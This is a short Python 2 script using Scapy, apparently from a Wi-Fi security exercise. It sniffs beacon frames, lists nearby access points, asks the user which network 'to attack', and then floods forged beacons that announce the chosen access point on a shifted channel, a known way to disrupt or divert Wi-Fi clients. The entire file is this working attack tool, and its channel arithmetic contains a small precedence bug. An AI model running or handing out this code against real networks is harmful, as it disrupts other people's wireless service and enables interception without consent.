#!/usr/bin/env python

# sources: 
# https://gist.github.com/securitytube/5291959
# https://pythontips.com/2018/09/08/sending-sniffing-wlan-beacon-frames-using-scapy/?utm_campaign=News&utm_medium=Community&utm_source=DataCamp.com
# https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
# https://scapy.readthedocs.io/en/latest/usage.html
# https://stackoverflow.com/questions/56644291/trying-to-retrieve-channel-from-802-11-frame-with-scapy

from scapy.all import *
import os

pkt_list = []
invalid = True
counter = -1
input_id = -1
chan = 0
interface = "wlan0mon"

def PacketHandler(pkt) :
	global counter
	global channel
	if pkt.haslayer(Dot11) :
		if pkt.type == 0 and pkt.subtype == 8 :
			if pkt not in pkt_list :
				pkt_list.append(pkt)
				counter += 1
				chan = pkt[Dot11Beacon].network_stats().get("channel")
				print "ID: %d - AP MAC: %s with SSID: %s On channel: %d  With Power: %d nBm" %(counter, pkt.addr2, pkt.info, chan, pkt.dBm_AntSignal)

# we start sniffing packets on interface wlan0mon, it must first be activated with sudo airmon-ng start wlan0
sniff(iface=interface, prn = PacketHandler, count=100)

# asking the user wich network to attack
while invalid:
	print("Please select which network to attack by their id:")
	
	# user input
	input_id = raw_input("Network id: ")

	if not input_id.isdigit():
		continue

	input_id = int(input_id)

	if input_id < 0 or input_id > len(pkt_list)-1:
		print("Invalid id")
	else:
		invalid = False
	
# we define a new variable which is the target the user chose to attack
target = pkt_list[input_id]

# the beacon will be 6 channels appart from the original one
chan = target[Dot11Beacon].network_stats().get("channel") + 6 % 14

# we put the beacon packet on the new channel
beacon = target/Dot11Elt(ID="DSset", info=chr(chan))

# switching channel on the interface
print "New channel is %d" %(chan)
print "Press CTRL+C to stop sending beacons: "
sendp(beacon, iface=interface, inter=0.1, loop=1)
print "Exiting..."
